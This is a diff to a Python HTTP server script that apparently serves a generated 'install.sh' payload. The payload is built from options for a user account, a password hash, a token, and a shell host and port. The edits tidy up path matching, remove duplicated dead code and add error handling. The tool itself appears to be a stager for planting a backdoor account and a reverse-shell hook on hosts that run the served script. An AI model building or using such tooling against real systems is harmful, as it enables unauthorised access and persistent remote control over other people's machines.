@@ -77,7 +77,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
     http_path: str = "/d"
 
     def _send(self) -> None:
-        ok = self.path in (self.http_path, "/install.sh")
+        path = self.path.split("?", 1)[0]     # ignore a query string
+        ok = path in (self.http_path, "/install.sh")
         body = self.body_override if ok else b"404"
         self.send_response(200 if ok else 404)
         if ok:
@@ -104,12 +105,6 @@ def build_server(*, bind: str, port: int, body: bytes, http_path: str = "/d"):
         "BoundHandler",
         (Handler,),
         {"body_override": body, "http_path": http_path},
-    )
-    return http.server.ThreadingHTTPServer((bind, port), handler)
-    handler = type(
-        "BoundHandler",
-        (Handler,),
-        {"body_override": body},
     )
     return http.server.ThreadingHTTPServer((bind, port), handler)
 
@@ -148,14 +143,17 @@ def main() -> int:
     shell_host = args.shell_host or ""
     shell_port = args.shell_port or ""
     extra_args = "--revert" if args.revert else ""
-    body = prepare_body(
-        user=args.user,
-        password_hash=password_hash,
-        token=args.token,
-        shell_host=shell_host,
-        shell_port=shell_port,
-        extra_args=extra_args,
-    )
+    try:
+        body = prepare_body(
+            user=args.user,
+            password_hash=password_hash,
+            token=args.token,
+            shell_host=shell_host,
+            shell_port=shell_port,
+            extra_args=extra_args,
+        )
+    except ValueError as error:
+        raise SystemExit(f"invalid account/hook options: {error}") from error
     body_sha256 = hashlib.sha256(body.encode("ascii")).hexdigest()
 
     try:
